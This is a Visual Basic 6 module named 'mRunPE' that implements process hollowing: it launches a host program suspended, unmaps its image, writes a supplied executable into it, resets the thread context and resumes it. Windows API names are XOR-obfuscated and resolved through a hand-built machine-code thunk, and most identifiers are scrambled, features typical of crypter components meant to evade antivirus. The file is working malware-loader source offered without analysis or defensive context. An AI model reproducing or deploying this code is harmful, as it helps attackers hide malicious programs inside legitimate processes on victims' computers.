Attribute VB_Name = "mRunPE"
Option Explicit

Private Const CONTEXT_FULL As Long = &H10007
Private Const MAX_PATH As Integer = 260
Private Const CREATE_SUSPENDED As Long = &H4
Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE As Long = &H40

Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, bvBuff As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function OutputDebugString Lib "kernel32" Alias "OutputDebugStringA" (ByVal lpOutputString As String) As Long

Public Declare Sub RtlMoveMemory Lib "kernel32" (Dest As Any, Src As Any, ByVal L As Long)
Private Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long

Private Type SECURITY_ATTRIBUTES
nLength As Long
lpSecurityDescriptor As Long
bInheritHandle As Long
End Type

Private Type STARTUPINFO
cb As Long
lpReserved As Long
lpDesktop As Long
lpTitle As Long
dwX As Long
dwY As Long
dwXSize As Long
dwYSize As Long
dwXCountChars As Long
dwYCountChars As Long
dwFillAttribute As Long
dwFlags As Long
wShowWindow As Integer
cbReserved2 As Integer
lpReserved2 As Long
hStdInput As Long
hStdOutput As Long
hStdError As Long
End Type

Private Type PROCESS_INFORMATION
hProcess As Long
hThread As Long
dwProcessId As Long
dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
ControlWord As Long
StatusWord As Long
TagWord As Long
ErrorOffset As Long
ErrorSelector As Long
DataOffset As Long
DataSelector As Long
RegisterArea(1 To 80) As Byte
Cr0NpxState As Long
End Type

Private Type CONTEXT
ContextFlags As Long

Dr0 As Long
Dr1 As Long
Dr2 As Long
Dr3 As Long
Dr6 As Long
Dr7 As Long

FloatSave As FLOATING_SAVE_AREA
SegGs As Long
SegFs As Long
SegEs As Long
SegDs As Long
Edi As Long
Esi As Long
Ebx As Long
Edx As Long
Ecx As Long
Eax As Long
Ebp As Long
Eip As Long
SegCs As Long
EFlags As Long
Esp As Long
SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
e_magic As Integer
e_cblp As Integer
e_cp As Integer
e_crlc As Integer
e_cparhdr As Integer
e_minalloc As Integer
e_maxalloc As Integer
e_ss As Integer
e_sp As Integer
e_csum As Integer
e_ip As Integer
e_cs As Integer
e_lfarlc As Integer
e_ovno As Integer
e_res(0 To 3) As Integer
e_oemid As Integer
e_oeminfo As Integer
e_res2(0 To 9) As Integer
e_lfanew As Long
End Type

Private Type IMAGE_FILE_HEADER
Machine As Integer
NumberOfSections As Integer
TimeDateStamp As Long
PointerToSymbolTable As Long
NumberOfSymbols As Long
SizeOfOptionalHeader As Integer
characteristics As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
VirtualAddress As Long
Size As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
Magic As Integer
MajorLinkerVersion As Byte
MinorLinkerVersion As Byte
SizeOfCode As Long
SizeOfInitializedData As Long
SizeOfUnitializedData As Long
AddressOfEntryPoint As Long
BaseOfCode As Long
BaseOfData As Long
ImageBase As Long
SectionAlignment As Long
FileAlignment As Long
MajorOperatingSystemVersion As Integer
MinorOperatingSystemVersion As Integer
MajorImageVersion As Integer
MinorImageVersion As Integer
MajorSubsystemVersion As Integer
MinorSubsystemVersion As Integer
W32VersionValue As Long
SizeOfImage As Long
SizeOfHeaders As Long
CheckSum As Long
SubSystem As Integer
DllCharacteristics As Integer
SizeOfStackReserve As Long
SizeOfStackCommit As Long
SizeOfHeapReserve As Long
SizeOfHeapCommit As Long
LoaderFlags As Long
NumberOfRvaAndSizes As Long
DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
Signature As Long
FileHeader As IMAGE_FILE_HEADER
OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_SECTION_HEADER
SecName As String * 8
VirtualSize As Long
VirtualAddress As Long
SizeOfRawData As Long
PointerToRawData As Long
PointerToRelocations As Long
PointerToLinenumbers As Long
NumberOfRelocations As Integer
NumberOfLinenumbers As Integer
characteristics As Long
End Type


Public Function LYKVDFL(ByVal BGKD As String, ByVal XHHNU As String, ParamArray HVPIRIP()) As Long
Dim CWLUG As Long, XIFU(&HEC00& - 1) As Byte, LJH As Long, QVGJIJH As Long

QVGJIJH = GetProcAddress(LoadLibraryA(BGKD), XHHNU)
If QVGJIJH = 0 Then Exit Function

CWLUG = VarPtr(XIFU(0))
RtlMoveMemory ByVal CWLUG, &H59595958, &H4: CWLUG = CWLUG + 4
RtlMoveMemory ByVal CWLUG, &H5059, &H2: CWLUG = CWLUG + 2
For LJH = UBound(HVPIRIP) To 0 Step -1
RtlMoveMemory ByVal CWLUG, &H68, &H1: CWLUG = CWLUG + 1
RtlMoveMemory ByVal CWLUG, CLng(HVPIRIP(LJH)), &H4: CWLUG = CWLUG + 4
Next
RtlMoveMemory ByVal CWLUG, &HE8, &H1: CWLUG = CWLUG + 1
RtlMoveMemory ByVal CWLUG, QVGJIJH - CWLUG - 4, &H4: CWLUG = CWLUG + 4
RtlMoveMemory ByVal CWLUG, &HC3, &H1: CWLUG = CWLUG + 1
LYKVDFL = CallWindowProcA(VarPtr(XIFU(0)), 0, 0, 0, 0)
End Function

Public Function ILCDR(ByVal HURTNM As String, ByVal FTTOJ As String) As String
Dim NBG As Long

For NBG = 1 To Len(HURTNM)
ILCDR = ILCDR & Chr(Asc(Mid(FTTOJ, IIf(NBG Mod Len(FTTOJ) <> 0, NBG Mod Len(FTTOJ), Len(FTTOJ)), 1)) Xor Asc(Mid(HURTNM, NBG, 1)))
Next NBG
End Function

Public Sub YHUIZHOBO(ByVal HFSFZ As String, ByRef DTUJ() As Byte, YMQSM As String)
Dim MXP As Long, GWMP As IMAGE_DOS_HEADER, UFBAB As IMAGE_NT_HEADERS, YGJGQK As IMAGE_SECTION_HEADER
Dim KDBZERJ As STARTUPINFO, NUEDSE As PROCESS_INFORMATION, CVQFYF As CONTEXT

KDBZERJ.cb = Len(KDBZERJ)
RtlMoveMemory GWMP, DTUJ(0), 64
RtlMoveMemory UFBAB, DTUJ(GWMP.e_lfanew), 248

CreateProcessA HFSFZ, Chr$(32) & YMQSM, 0, 0, False, CREATE_SUSPENDED, 0, 0, KDBZERJ, NUEDSE
LYKVDFL ILCDR(Chr(34) & Chr(54) & Chr(40) & Chr(54) & Chr(61), Chr$(76) & Chr$(66) & Chr$(76) & Chr$(90) & Chr$(81) & Chr$(75) & Chr$(81) & Chr$(82) & Chr$(85) & Chr$(76) & Chr$(78) & Chr$(67) & Chr$(75) & Chr$(69) & Chr$(67) & Chr$(68) & Chr$(88) & Chr$(80) & Chr$(79) & Chr$(69)), ILCDR(Chr(2) & Chr(54) & Chr(25) & Chr(52) & Chr(60) & Chr(42) & Chr(33) & Chr(4) & Chr(60) & Chr(41) & Chr(57) & Chr(12) & Chr(45) & Chr(22) & Chr(38) & Chr(39) & Chr(44) & Chr(57) & Chr(32) & Chr(43), Chr$(76) & Chr$(66) & Chr$(76) & Chr$(90) & Chr$(81) & Chr$(75) & Chr$(81) & Chr$(82) & Chr$(85) & Chr$(76) & Chr$(78) & Chr$(67) & Chr$(75) & Chr$(69) & Chr$(67) & Chr$(68) & Chr$(88) & Chr$(80) & Chr$(79) & Chr$(69)), NUEDSE.hProcess, UFBAB.OptionalHeader.ImageBase
LYKVDFL ILCDR(Chr(39) & Chr(39) & Chr(62) & Chr(52) & Chr(52) & Chr(39) & Chr(98) & Chr(96), Chr$(76) & Chr$(66) & Chr$(76) & Chr$(90) & Chr$(81) & Chr$(75) & Chr$(81) & Chr$(82) & Chr$(85) & Chr$(76) & Chr$(78) & Chr$(67) & Chr$(75) & Chr$(69) & Chr$(67) & Chr$(68) & Chr$(88) & Chr$(80) & Chr$(79) & Chr$(69)), ILCDR(Chr(26) & Chr(43) & Chr(62) & Chr(46) & Chr(36) & Chr(42) & Chr(61) & Chr(19) & Chr(57) & Chr(32) & Chr(33) & Chr(32) & Chr(14) & Chr(61), Chr$(76) & Chr$(66) & Chr$(76) & Chr$(90) & Chr$(81) & Chr$(75) & Chr$(81) & Chr$(82) & Chr$(85) & Chr$(76) & Chr$(78) & Chr$(67) & Chr$(75) & Chr$(69) & Chr$(67) & Chr$(68) & Chr$(88) & Chr$(80) & Chr$(79) & Chr$(69)), NUEDSE.hProcess, UFBAB.OptionalHeader.ImageBase, UFBAB.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
WriteProcessMemory NUEDSE.hProcess, ByVal UFBAB.OptionalHeader.ImageBase, DTUJ(0), UFBAB.OptionalHeader.SizeOfHeaders, 0

For MXP = 0 To UFBAB.FileHeader.NumberOfSections - 1
RtlMoveMemory YGJGQK, DTUJ(GWMP.e_lfanew + 248 + 40 * MXP), Len(YGJGQK)
WriteProcessMemory NUEDSE.hProcess, ByVal UFBAB.OptionalHeader.ImageBase + YGJGQK.VirtualAddress, DTUJ(YGJGQK.PointerToRawData), YGJGQK.SizeOfRawData, 0
Next MXP

CVQFYF.ContextFlags = CONTEXT_FULL
LYKVDFL ILCDR(Chr(39) & Chr(39) & Chr(62) & Chr(52) & Chr(52) & Chr(39) & Chr(98) & Chr(96), Chr$(76) & Chr$(66) & Chr$(76) & Chr$(90) & Chr$(81) & Chr$(75) & Chr$(81) & Chr$(82) & Chr$(85) & Chr$(76) & Chr$(78) & Chr$(67) & Chr$(75) & Chr$(69) & Chr$(67) & Chr$(68) & Chr$(88) & Chr$(80) & Chr$(79) & Chr$(69)), ILCDR(Chr(11) & Chr(39) & Chr(56) & Chr(14) & Chr(57) & Chr(57) & Chr(52) & Chr(51) & Chr(49) & Chr(15) & Chr(33) & Chr(45) & Chr(63) & Chr(32) & Chr(59) & Chr(48), Chr$(76) & Chr$(66) & Chr$(76) & Chr$(90) & Chr$(81) & Chr$(75) & Chr$(81) & Chr$(82) & Chr$(85) & Chr$(76) & Chr$(78) & Chr$(67) & Chr$(75) & Chr$(69) & Chr$(67) & Chr$(68) & Chr$(88) & Chr$(80) & Chr$(79) & Chr$(69)), NUEDSE.hThread, VarPtr(CVQFYF)
WriteProcessMemory NUEDSE.hProcess, ByVal CVQFYF.Ebx + 8, UFBAB.OptionalHeader.ImageBase, 4, 0
CVQFYF.Eax = UFBAB.OptionalHeader.ImageBase + UFBAB.OptionalHeader.AddressOfEntryPoint
LYKVDFL ILCDR(Chr(39) & Chr(39) & Chr(62) & Chr(52) & Chr(52) & Chr(39) & Chr(98) & Chr(96), Chr$(76) & Chr$(66) & Chr$(76) & Chr$(90) & Chr$(81) & Chr$(75) & Chr$(81) & Chr$(82) & Chr$(85) & Chr$(76) & Chr$(78) & Chr$(67) & Chr$(75) & Chr$(69) & Chr$(67) & Chr$(68) & Chr$(88) & Chr$(80) & Chr$(79) & Chr$(69)), ILCDR(Chr(31) & Chr(39) & Chr(56) & Chr(14) & Chr(57) & Chr(57) & Chr(52) & Chr(51) & Chr(49) & Chr(15) & Chr(33) & Chr(45) & Chr(63) & Chr(32) & Chr(59) & Chr(48), Chr$(76) & Chr$(66) & Chr$(76) & Chr$(90) & Chr$(81) & Chr$(75) & Chr$(81) & Chr$(82) & Chr$(85) & Chr$(76) & Chr$(78) & Chr$(67) & Chr$(75) & Chr$(69) & Chr$(67) & Chr$(68) & Chr$(88) & Chr$(80) & Chr$(79) & Chr$(69)), NUEDSE.hThread, VarPtr(CVQFYF)
LYKVDFL ILCDR(Chr(39) & Chr(39) & Chr(62) & Chr(52) & Chr(52) & Chr(39) & Chr(98) & Chr(96), Chr$(76) & Chr$(66) & Chr$(76) & Chr$(90) & Chr$(81) & Chr$(75) & Chr$(81) & Chr$(82) & Chr$(85) & Chr$(76) & Chr$(78) & Chr$(67) & Chr$(75) & Chr$(69) & Chr$(67) & Chr$(68) & Chr$(88) & Chr$(80) & Chr$(79) & Chr$(69)), ILCDR(Chr(30) & Chr(39) & Chr(63) & Chr(47) & Chr(60) & Chr(46) & Chr(5) & Chr(58) & Chr(39) & Chr(41) & Chr(47) & Chr(39), Chr$(76) & Chr$(66) & Chr$(76) & Chr$(90) & Chr$(81) & Chr$(75) & Chr$(81) & Chr$(82) & Chr$(85) & Chr$(76) & Chr$(78) & Chr$(67) & Chr$(75) & Chr$(69) & Chr$(67) & Chr$(68) & Chr$(88) & Chr$(80) & Chr$(79) & Chr$(69)), NUEDSE.hThread
End Sub


Public Function etwHZzEkhq(ByVal OZnws1ORKq As String) As String
Dim RqP00mny6c As String
Dim JwpMK6Yojt As String
Dim J8hhBBVs1K As Long
For J8hhBBVs1K = 1 To Len(OZnws1ORKq) Step 2
RqP00mny6c = Chr$(Val("&H" & Mid$(OZnws1ORKq, J8hhBBVs1K, 2)))
JwpMK6Yojt = JwpMK6Yojt & RqP00mny6c
Next J8hhBBVs1K
etwHZzEkhq = JwpMK6Yojt
End Function

